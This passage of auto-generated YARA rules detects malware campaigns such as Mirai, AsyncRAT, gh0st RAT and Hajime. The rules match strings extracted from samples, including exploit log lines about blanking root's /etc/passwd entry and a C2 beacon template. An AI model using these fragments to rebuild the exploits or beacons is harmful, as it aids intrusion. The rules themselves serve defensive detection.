        $s8 = "><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></tru" ascii
        $s9 = "\\Microsoft\\Internet Explorer\\Quick Launch" wide
        $s10 = "Installer integrity check has failed. Common causes include" wide
        $s11 = "Error writing temporary file. Make sure your temp folder is valid." wide
    condition:
        uint16(0) == 0x5A4D and filesize < 2555904 and 12 of them
}

rule Sightlines_tlsh_a4217816_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a4217816"
        date = "2026-10-30"
        campaign = "tlsh-a4217816"
        family = ""
        hash = "10290f113204c92214abfc94fcf64a92823ee2a4436e286bc67193884604ad57"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a4217816.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "nU01Z!Adu]-s;Eb}Za" ascii
        $s1 = "U,o[iUimaucvXYVPf" ascii
        $s2 = "fabric.mod.jsonPK" ascii
        $s3 = "f`u5\\K6q155T@XV" ascii
        $s4 = "8l9]o#5tYHnaK\"" ascii
        $s5 = "OW:xI>Y\"^Ow4xIa" ascii
        $s6 = "B$'$U<BMwaGICL" ascii
        $s7 = "&c<Z9dIieYJH." ascii
        $s8 = "C1Yz_}d9w=?m8" ascii
        $s9 = "N2dM>\\iB/3rFA" ascii
        $s10 = "H?LH?PH?TH?XH?\\H?fH" ascii
        $s11 = "B*ItAa=?I:%nt" ascii
    condition:
        filesize < 5891420 and 12 of them
}

rule Sightlines_tlsh_5d7e0e15_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-5d7e0e15"
        date = "2026-10-30"
        campaign = "tlsh-5d7e0e15"
        family = ""
        hash = "0defa131ec7e1d8ada99b9d04e4a20d7749711690b9d7cd696404595647c4671"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-5d7e0e15.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "kgo.com/\"https:/expand 32-byte kow.com/\"https://ation/xhtml+xml,A,en;q=0.9,fr-CA" ascii
        $s1 = "[+] compiled: gcc -O2 -static -DARCH=arm7 -DKILLER=1" ascii
        $s2 = "[+] mmap'd %s page-cache at %p (PROT_READ|MAP_SHARED)" ascii
        $s3 = "[0m BUG: byte changed but desired-value check mismatched index=%zu offset=%llu desired=%02x got=%02x" ascii
        $s4 = "[+] PRIMITIVE proven: root entry has empty passwd field via NSS." ascii
        $s5 = "[0m BUG: final verify mismatch index=%zu offset=%llu desired=%02x got=%02x" ascii
        $s6 = "[+] rxrpc module autoloaded via dummy socket(AF_RXRPC)" ascii
        $s7 = "q=0.8\"text/html,,application/xmlml+xml,applicatinge;v=b3;q=0.7\"tq=0.9,en;q=0.8\"j" ascii
        $s8 = "[*] /etc/passwd line 1 (root entry) BEFORE: '" ascii
        $s9 = "[+] uid/gid identity-mapped %u/%u; gained CAP_NET_RAW within netns" ascii
        $s10 = "le.com/\"https:///\"https://twittescord.com/\"httpson/xml;q=0.9,iman-US,en;q=0.9,es" ascii
        $s11 = "{\"id\":\"%s\",\"cmp\":\"%s\",\"stage\":\"beacon\",\"uptime\":%u,\"token\":\"eyJhbGciOiJIUzI1NiJ9.decoy.token\"}" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_fd1e62a6_asyncrat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-fd1e62a6"
        date = "2026-10-20"
        campaign = "tlsh-fd1e62a6"
        family = "asyncrat"
        hash = "2afe1e0fc216a059f2a7210b241b0d1b0e47135691a90ed3bfdbb574052d8843"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-fd1e62a6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " \"$&(*,.02468:<>@BDFHJLNPRTVXZ\\^`bdfhjlnprtvxz|~" ascii
        $s1 = "      <activeCodePage xmlns=\"http://schemas.microsoft.com/SMI/2019/WindowsSettings\">UTF-8</activeCod" ascii
        $s2 = "  <assemblyIdentity type=\"win32\" name=\"Peridot.DesktopUtility\" version=\"3.2.0.0\" processorArchitectu" ascii
        $s3 = "Reserving %zd bytes (%.3f mb) for GC bookkeeping failed" ascii
        $s4 = "System.Text.Json.JsonSerializer.IsReflectionEnabledByDefault" ascii
        $s5 = "System.Linq.Expressions.CanEmitObjectArrayDelegate" ascii
        $s6 = "Committing %zd bytes (%.3f mb) for GC bookkeeping element#%d failed" ascii
        $s7 = "System.ComponentModel.TypeConverter.EnableUnsafeBinaryFormatterInDesigntimeLicenseContextSerializati" ascii
        $s8 = "Process is terminating due to StackOverflowException." ascii
        $s9 = "InternalHijack: TgtThread = %llx, IP = %p" ascii
        $s10 = "Lock_Enter_WaiterCountOverflow_OutOfMemoryException" wide
        $s11 = "System.Threading.Lock.AdaptiveSpinPeriod" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1918976 and 12 of them
}

rule Sightlines_tlsh_29ebdb38_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-29ebdb38"
        date = "2026-10-30"
        campaign = "tlsh-29ebdb38"
        family = "mirai"
        hash = "48d5b33e4aa1f20faa096231260136029f3d3f5c329a3f85a154662f12170361"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-29ebdb38.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "851PGyBc7mdh4L72Viz5f9QggJuAzFTP9JXdvngQJFNh5nwRb8dpNjgWCDDC5T7JJ7HcKoAsRG1JWjkq5HqvcEBYHi1Yq8b" ascii
        $s1 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s2 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s3 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
        $s4 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s5 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s6 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s7 = "WARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored." ascii
        $s8 = "info[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))" ascii
        $s9 = "info[DT_RELENT]->d_un.d_val == sizeof (ElfW(Rel))" ascii
        $s10 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s11 = "(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2017068 and 12 of them
}

rule Sightlines_tlsh_efc34bb9_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-efc34bb9"
        date = "2026-10-30"
        campaign = "tlsh-efc34bb9"
        family = "mirai"
        hash = "230358697a04628990cfa14a90b7c3d241a0575fba7d8fb0891492973c6e4b7d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-efc34bb9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "851PGyBc7mdh4L72Viz5f9QggJuAzFTP9JXdvngQJFNh5nwRb8dpNjgWCDDC5T7JJ7HcKoAsRG1JWjkq5HqvcEBYHi1Yq8b" ascii
        $s1 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s2 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s3 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
        $s4 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s5 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s6 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s7 = "WARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored." ascii
        $s8 = "info[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))" ascii
        $s9 = "info[DT_RELENT]->d_un.d_val == sizeof (ElfW(Rel))" ascii
        $s10 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s11 = "(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2025260 and 12 of them
}

rule Sightlines_tlsh_e066f0e1_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e066f0e1"
        date = "2026-10-30"
        campaign = "tlsh-e066f0e1"
        family = ""
        hash = "11e4d3ce47e82d27aca5b14b6e8710655ff2805d5865c6d6d1ce20b846b5ad16"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e066f0e1.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "META-INF/kuznya-integrity-targetPK" ascii
        $s1 = "META-INF/kuznya-integrity-targetKu" ascii
        $s2 = "^urB{EdK~iW\\hoe|KBJW|Q" ascii
        $s3 = "client.accesswidenerPK" ascii
        $s4 = "ts[iFKQyUBAClDMjTC" ascii
        $s5 = "\\w^pOUxcMJkiIwHt_" ascii
        $s6 = "PyfoZ]WvEWq~oNY_J" ascii
        $s7 = "fabric.mod.jsonPK" ascii
        $s8 = "X{e|OZVCLXGdEkyu" ascii
        $s9 = "1_iKaCagzuzsz}z{z-" ascii
        $s10 = "kDIp~ZIybQ*CAbf^" ascii
        $s11 = "If?Kqheg|<+[}zU" ascii
    condition:
        filesize < 39490666 and 12 of them
}

rule Sightlines_imphash_a731d9ff_gh0strat
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-a731d9ff"
        date = "2026-10-30"
        campaign = "imphash-a731d9ff"
        family = "gh0strat"
        hash = "01c1d69e51631a9dcd20beb62278497e0e2b164cd5955c7750299f67ab93826f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-a731d9ff.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s2 = "<file name=\"textshaping.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s3 = "<file name=\"winhttp.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s4 = "        <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s5 = "        <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s6 = "        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s7 = "<file name=\"netapi32.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
        $s8 = "VTEnumerable<System.Generics.Collections.TPair<System.TypInfo.PTypeInfo,System.string>>'" ascii
        $s9 = "VTEnumerable<System.Generics.Collections.TPair<System.string,System.TypInfo.PTypeInfo>>'" ascii
        $s10 = "        <supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"/>" ascii
        $s11 = "<file name=\"version.dll\" loadFrom=\"%SystemRoot%\\system32\\\" />" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 41387930 and 12 of them
}

rule Sightlines_imphash_4eb92592_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-4eb92592"
        date = "2026-10-30"
        campaign = "imphash-4eb92592"
        family = ""
        hash = "0d0448174d811b743faed2c1600b6174f33e65506e196b177effe0cd7a04cdb2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-4eb92592.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "command line encoding conversion failure" ascii
        $s1 = "XPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPADDINGPADDINGXXPAD" ascii
        $s2 = "Windows original main args:" ascii
        $s3 = "JLI_InitArgProcessing" ascii
        $s4 = "_JAVA_LAUNCHER_DEBUG" ascii
        $s5 = "JLI_GetStdArgc" ascii
        $s6 = "JLI_GetStdArgs" ascii
        $s7 = "380114235959Z0i1" ascii
        $s8 = "JLI_CmdToArgs" ascii
        $s9 = "360903235959Z0c1" ascii
        $s10 = "JLI_MemAlloc" ascii
        $s11 = "Full Version" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_05d1532b_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-05d1532b"
        date = "2026-10-30"
        campaign = "tlsh-05d1532b"
        family = ""
        hash = "2cd3b5ebc97aff79685c34024ef13a3880aed9c26bb9d82c673ee765b134b6a5"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-05d1532b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "amsOwahSelaTragUiguBtpoCgalGrahKulaToepXolySgnfTilaBxusXookNgahPxnhPiraCmahCilaKcpeLicyLidyLkclOgnjR" ascii
        $s1 = "araWmohAwulHrtaHtluMgnuHwngSmldAskhBcraMegsOgnaTaweNmnoGuhsNoyoSbnaZrgoDgnoGghoRakaMfdeMogoSdgoSmylE" ascii
        $s2 = "tbiTopoBiarBsnaCrehCihtErmhKgnoMrmyMmagOrnuRhniScrySaahTiiiYtrsDhtoGlatIdhuBonaHglgTbgaTtrpCbmiLbniL" ascii
        $s3 = "drhSaroSrkaTssaBbhgAlpuDablEnarGjohKdniSaniLjhaMinaMdneMidoMoorMtabNbraNmrePgnmHmlaPcuaPplhPddiShriT" ascii
        $s4 = "ruaSdnuSiiaVtsvAumaBpygEimrAilhPitrPavaJihtKusiLietMbraShkrOrmaSanaLtvaTktaBharBdnaMmkaCcreMoreMdrlP" ascii
        $s5 = "Java_sun_font_FileFontStrike__1getGlyphImageFromWindows" ascii
        $s6 = "yyyZhniZbarAnmrAgneBopoBrehCtpoClryCtrsDaveDihtEroeGhtoGkerGrjuGuruGinaHgnaHrbeHariHadnKanaKrmhKooaL" ascii
        $s7 = "yyyZhniZzzzZbarAnmrAgneBlryCaveDroeGkerGrjuGuruGgnaHinaHrbeHariHadnKanaKooaLntaLmylMayrOlmaTuleTiahT" ascii
        $s8 = "JNU_ThrowArrayIndexOutOfBoundsException" ascii
        $s9 = "Java_sun_font_FreetypeFontScaler_getMissingGlyphCodeNative" ascii
        $s10 = "ntaLmylMgnoMrmyMmagOlatIayrOrnuRhniScrySlmaTuleTaahTiahTtbiTsnaCiiiYglgTonaHdhuBbgaT" ascii
        $s11 = "Java_sun_font_FreetypeFontScaler_getGlyphOutlineBoundsNative" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2060528 and 12 of them
}

rule Sightlines_tlsh_bd95bcfe_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-bd95bcfe"
        date = "2026-10-30"
        campaign = "tlsh-bd95bcfe"
        family = ""
        hash = "98635d214b33c5123136feccb41cd86c5ecb11355d3520ee1528795d867e9d3d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-bd95bcfe.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "INFLATER_inflateFully: Compressed data corrupted" ascii
        $s1 = "INFLATER_inflateFully: Unexpected end of stream" ascii
        $s2 = "zlib returned Z_VERSION_ERROR: compile time and runtime zlib implementations differ" ascii
        $s3 = "ZIP_Read: corrupt zip file: invalid entry size" ascii
        $s4 = "invalid CEN header (bad compression method)" ascii
        $s5 = "Java_java_util_zip_CRC32_updateByteBuffer0" ascii
        $s6 = "invalid END header (bad central directory offset)" ascii
        $s7 = "Java_java_util_zip_Inflater_setDictionaryBuffer" ascii
        $s8 = "invalid END header (bad central directory size)" ascii
        $s9 = "Java_java_util_zip_Adler32_updateByteBuffer" ascii
        $s10 = "Java_java_util_zip_Deflater_setDictionaryBuffer" ascii
        $s11 = "unknown error in checkDeflateStatus, setParams case" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_21588f40_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-21588f40"
        date = "2026-10-30"
        campaign = "tlsh-21588f40"
        family = ""
        hash = "673796ea5cecdfac68f8a2895faf94136863d944dc176dc9cccf1efca5c180ad"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-21588f40.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Java_jdk_internal_jimage_NativeImageBuffer_getNativeMap" ascii
        $s1 = "Failure, expecting %llu but getting %llu" ascii
        $s2 = ".?AVSharedStringDecompressor@@" ascii
        $s3 = "JIMAGE_PackageToModule" ascii
        $s4 = ".?AVImageDecompressor@@" ascii
        $s5 = "JIMAGE_ResourceIterator" ascii
        $s6 = ".?AVZipDecompressor@@" ascii
        $s7 = "JIMAGE_FindResource" ascii
        $s8 = ".?AVSwappingEndian@@" ascii
        $s9 = "JIMAGE_GetResource" ascii
        $s10 = ".?AVNativeEndian@@" ascii
        $s11 = "ZIP_InflateFully" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_629f03b5_hajime
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-629f03b5"
        date = "2026-10-30"
        campaign = "tlsh-629f03b5"
        family = "hajime"
        hash = "85e56cb095192357ab4d8e40ee9539be7d1c0579a2b6fc7a10373e1230822606"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-629f03b5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "+Bjy,2pSJz-" ascii
        $s1 = "3Jg~|y-(Smx" ascii
        $s2 = "%Zeha um" ascii
        $s3 = ":IAJpM?Q" ascii
        $s4 = "EFZ|rU8j" ascii
        $s5 = "aOetZL(g" ascii
        $s6 = "f9E aAH=" ascii
        $s7 = "H@bXGb=?" ascii
        $s8 = "MspMe\"CA" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 9 of them
}

rule Sightlines_signer_cert_sha1_55014a0f_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-55014a0f"
        date = "2026-10-30"
        campaign = "signer_cert_sha1-55014a0f"
        family = ""
        hash = "052ad6a20d375957e82aa6a3c441ea548d89be0981516ca7eb306e063d5027f4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-55014a0f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "20250118131503Z0w0=" ascii
        $s1 = "250820192644Z0t1" ascii
        $s2 = "230889+5027690" ascii
        $s3 = "20250117131503Z" ascii
        $s4 = "250820195927Z0" ascii
        $s5 = "240822195927Z" ascii
        $s6 = "230217+5027230" ascii
        $s7 = "240822192644Z" ascii
        $s8 = "/iAMy!X~" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1171744 and 9 of them
}

rule Sightlines_signer_cert_sha1_d5979408_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-d5979408"
        date = "2026-10-30"
        campaign = "signer_cert_sha1-d5979408"
        family = ""
        hash = "03d233dbace599168eaffec823de6ed7beec8c2a4ebfe9b8a3d8e042a59af3ba"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-d5979408.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Xhttp://www.microsoft.com/pkiops/certs/Microsoft%20ID%20Verified%20CS%20AOC%20CA%2001.crt0-" ascii
        $s1 = "Vhttp://www.microsoft.com/pkiops/crl/Microsoft%20ID%20Verified%20CS%20AOC%20CA%2001.crl0" ascii
        $s2 = "\"Microsoft ID Verified CS AOC CA 010" ascii
        $s3 = "FBuilt: Release_v3.12.10_20250408.0" wide
        $s4 = "260413173154Z0Z1" ascii
        $s5 = "250411010724Z0|1" ascii
        $s6 = "210413173154Z" ascii
        $s7 = "250408010724Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 13890544 and 8 of them
}

rule Sightlines_signer_cert_sha1_8c027527_netsupport
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-8c027527"
        date = "2026-10-30"
        campaign = "signer_cert_sha1-8c027527"
        family = "netsupport"
        hash = "028c2b444ec7abddb13448c13317d1e26d7a644c65e2371d9115e1b9eff96daa"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-8c027527.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "120614235959Z0\\1" ascii
        $s1 = "131203235959Z0S1" ascii
        $s2 = "TSA2048-1-530" ascii
        $s3 = "Western Cape1" ascii
        $s4 = "Durbanville1" ascii
        $s5 = "image/gif0!0" ascii
        $s6 = "031204000000Z" ascii
        $s7 = "070615000000Z" ascii
        $s8 = "6^bMRQ4q" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 8 of them
}

rule Sightlines_tlsh_8821e6fd_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-8821e6fd"
        date = "2026-10-30"
        campaign = "tlsh-8821e6fd"
        family = ""
        hash = "070c1ba6ebba5185fc3ebe69c200b2fc2102cbfd52003e38dddfc8b340b707a4"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-8821e6fd.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "start \"zapret2\" /min \"%~dp0bin\\winws2.exe\" \"--wf-tcp-out\" \"80,443,2053,2083,2087,2096,8443\" \"--wf-ud" ascii
        $s1 = "p-out\" \"443,19294-19344,50000-50100\" \"--lua-init=@%~dp0lua\\zapret-lib.lua\" \"--lua-init=@%~dp0lua\\zap" ascii
        $s2 = "tasklist /FI \"IMAGENAME eq winws.exe\" /NH 2>nul | findstr /I \"winws.exe\" >nul" ascii
        $s3 = "    echo ERROR: Zapret 1 is running - stop winws.exe first." ascii
        $s4 = "if not errorlevel 1 (" ascii
        $s5 = "@echo off" ascii
    condition:
        filesize < 1048576 and 5 of them
}

rule Sightlines_c2_3f32a392_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-3f32a392"
        date = "2026-10-29"
        campaign = "c2-3f32a392"
        family = ""
        hash = "16454925fc2331d7537bb9fbabda31ea099e9dadc50c36fa75f3b0f76c88d089"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-3f32a392.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "    $script:AppMutex = New-Object System.Threading.Mutex($true, 'Global\\ZapretControlGUI', [ref]$scr" ascii
        $s1 = "$tmp = Join-Path $env:TEMP ('zapret_upd_' + [Guid]::NewGuid().ToString('N'))" ascii
        $s2 = "      <Grid x:Name=\"BusyOverlay\" Background=\"#B3040705\" Visibility=\"Collapsed\" Margin=\"0,58,0,0\">" ascii
        $s3 = "    if ([string]::IsNullOrWhiteSpace($body)) { $body = 'domain.example.abc' }" ascii
        $s4 = "    try { [IO.File]::AppendAllText($script:LogFile, ('{0}  {1}{2}' -f (Get-Date -Format 'yyyy-MM-dd " ascii
        $s5 = "    if ($ui.TglUpd.IsChecked) { Set-Content -LiteralPath $flag -Value 'ENABLED' -Encoding ASCII; Log" ascii
        $s6 = "$ui.LnkTg.Add_Click({ try { Start-Process 'https://t.me/masiuniv' } catch {} })" ascii
        $s7 = "      <Grid x:Name=\"DialogOverlay\" Background=\"#99040705\" Visibility=\"Collapsed\">" ascii
        $s8 = "HH:mm:ss'), $msg, [Environment]::NewLine), [Text.Encoding]::UTF8) } catch {}" ascii
        $s9 = "11.5\" Foreground=\"{StaticResource TextMid}\" Margin=\"7,0,22,0\"/>" ascii
        $s10 = "$DotGlow.Color = [System.Windows.Media.ColorConverter]::ConvertFromString('#34D399')" ascii
        $s11 = "\" FontSize=\"12.5\" FontWeight=\"Medium\" Foreground=\"{StaticResource TextMid}\" Margin=\"7,0,0,0\"/>" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_adbcd5e2_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-adbcd5e2"
        date = "2026-10-30"
        campaign = "tlsh-adbcd5e2"
        family = ""
        hash = "692b58911f7e0d793b735b4141e7a48555c79a095fc85a201efaa9b068c3b888"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-adbcd5e2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  \"signature\": \"h2IBN9F1vbHaEupR607T7sENtak56DQ/swFTfWfYV/GC7pUMgZ3rXOf9v1MjBPEbANILugwthcCV5/ezhc/g" ascii
        $s1 = "<RSAKeyValue><Modulus>x43zwaHqbxWvjGJnuMtMw5ljKJSPAZYOyDaXW6USRC0rWkSzPC1BGbEWEXg/7LwTWDj6fJp6/bnieq" ascii
        $s2 = "e3FyAILqv41WCzEbbWObPjoQ4lWY/JrgrNI6LV7yc0aAYQpGF6p+oHwmRoBZqb4IG92ACgau7GTUsRxOhM+KLTCRTBOIC14JeonX" ascii
        $s3 = "feBH6OtO8ie4j8WyUUbSGypwjQlGNqGFk6Xp/WeMGBME3PBKiYVBA6o81KiCZ/jauESfxLgHHTJc4+pwvSsMidyn1pLZryLBdz9h" ascii
        $s4 = "Dls7NcHwEjZADkLz+dn2NpVnSSCTkib48KO1K195ZLYWfVkN5bj86eoXLl9TQd3nYdYWFzg6B7+/d3wKAhXmDmyhbQoyYMMJCzid" ascii
        $s5 = "IYp3bslhn63/6YA28HkoGMs8r5HgK5Obv0Z+wzicEvMST94qiicoX0S5PzRDKyM2Bc0ZXqiRh+M1GwVTcAQGZraidllSge/fuw2a" ascii
        $s6 = "5JNeMWjWe+ZZ1X1SR9Kspa0ELRoIXSuzK80wHv6dIvEMlSvahWyxC1m4nl/7CA3NVAvXWZycAQhvHu65jByC2QY6MUbYaajydUUi" ascii
        $s7 = "j69C+OZwJ6ONPpxKwk/XVIPhpajvNhSzMG3TAdaJF4g7nZg9J34R+8ejbuQtwqmfQqGmTemU5KLmIAZYIjaU04GKxQzpUYjIn4IH" ascii
        $s8 = "+rnGSc9Hy/e2mo+n5LlPdj+tICGQ3rRXMvmsfWcRNMCCC1NV4HhYndBfJ3o1SMirpwI/S8QIN3BZ+Fmu4tyyQWG+7y5qSbkrpL75" ascii
        $s9 = "1qlwcXuG0lcEXBmIOlvwqty0shX31HW9xZsogG5qqNPkkOu5ZPzUtGqe8ukpjRuk/sId3o0ljWhWQJNqbb1qNS7xEhdzDjD3OKAr" ascii
        $s10 = "xNjc0Y2M1NDBmM2E1NmUiLCJwYXRoIjoiYmluL3F1aWNfaW5pdGlhbF80cGRhX3RvLmJpbiIsInNpemUiOjEyNTB9LHsic2hhMjU" ascii
        $s11 = "wN2QyNSIsInBhdGgiOiJnZW5lcmFsIChBTFQ0KS5iYXQiLCJzaXplIjozODg3fSx7InNoYTI1NiI6ImE4MWMyNzZlY2FlMzRjM2M" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2279424 and 12 of them
}

rule Sightlines_tlsh_3c4527d6_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3c4527d6"
        date = "2026-10-30"
        campaign = "tlsh-3c4527d6"
        family = ""
        hash = "91a9cba11343143452576e51bfc6a407cfb2b0cfc5252dfa2ce8b800f92ee58f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3c4527d6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "multiLocalizedUnicodeType of len != 12 is not supported." ascii
        $s1 = "Unsupported number of channels for VCGT '%d'" ascii
        $s2 = "Wrong position of PCS. 1..255 expected, %d found." ascii
        $s3 = "Wrong number of profiles. 1..255 expected, %d found." ascii
        $s4 = "Too many input channels (%d channels, max=%d)" ascii
        $s5 = "Unsupported interpolation (%d->%d channels)" ascii
        $s6 = "LUT with different samples per dimension not suitable to be saved as LUT16" ascii
        $s7 = "(internal) %d Channels are not supported on PatchLUT" ascii
        $s8 = "Channel count doesn't match. Profile is corrupted" ascii
        $s9 = "(internal) Attempt to PatchLUT on non-lut stage" ascii
        $s10 = "Cannot save floating point data, CLUT are 8 or 16 bit only" ascii
        $s11 = "'%s' Inconsistent number of items: expected %d, got %d" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_73b26a67_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-73b26a67"
        date = "2026-10-29"
        campaign = "imphash-73b26a67"
        family = ""
        hash = "06c3f201b815a5798816e8c15b925b28f3c38e5aba31efedec10af9e598ce723"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-73b26a67.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "System\\CurrentControlSet\\Services\\EventLog\\System\\WinDivert" ascii
        $s1 = "Filter expression array index is out-of-bounds" ascii
        $s2 = "Filter expression contains a bad token for layer" ascii
        $s3 = "WinDivertHelperFormatIPv4Address" ascii
